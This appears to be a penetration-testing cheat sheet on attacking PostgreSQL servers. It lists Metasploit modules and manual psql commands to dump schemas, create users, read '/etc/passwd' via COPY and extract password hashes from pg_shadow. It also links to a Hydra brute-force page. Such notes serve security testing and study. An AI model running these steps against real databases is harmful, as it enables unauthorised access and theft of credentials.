# PostGreSQL

## Enumeration using metasploit

### Determining Version of PostGreSQL Server

Metasploit can be used to determine the version of a PostGreSQL server using the following auxiliary module:

`use auxiliary/scanner/postgres/postgres_version`

### Dumping Database Schema

Setting the RHOST value to the target server and using the following auxiliary module:

`use auxiliary/scanner/postgres/postgres_schemadump`

### Create a database user 

Setting the RHOST value to the target server and using the following auxiliary module:

`use auxiliary/admin/postgres/postgres_sql`

`set SQL CREATE USER <username>;`

### Dump PostGreSQL Usernames and Password Hashes

Setting the RHOST value to the target server and using the following auxiliary module:

`use auxiliary/scanner/postgres/postgres_hashdump`

### Read Local File

The following auxiliary module can be used to read a file from the local file system:

`use auxiliary/admin/postgres/postgres_readfile`

`set RFILE /path/to/file.txt`

`set RHOSTS <IP>`

## Manual Enumeration

### Read Local file

1) Connect to the postgres database 

`psql -h <IP> -U <username>`

2) Create a new table to store the contents of the file:

`CREATE TABLE tablename(t TEXT);`

3) Copy the contents of the file into table:

`COPY tablename FROM '/etc/passwd';`

4) Show the contents of the file stored within the table "tablename"

`SELECT * FROM tablename limit 30 offset 0;`

### Dump PostGreSQL Database Usernames and Password Hashes

`select usename, passwd from pg_shadow;`

## Bruteforcing Login Passwords

### Bruteforcing using Hydra

[Hydra PostGres Bruteforce](../password-cracking/hydra.md#postgresql-database-login)
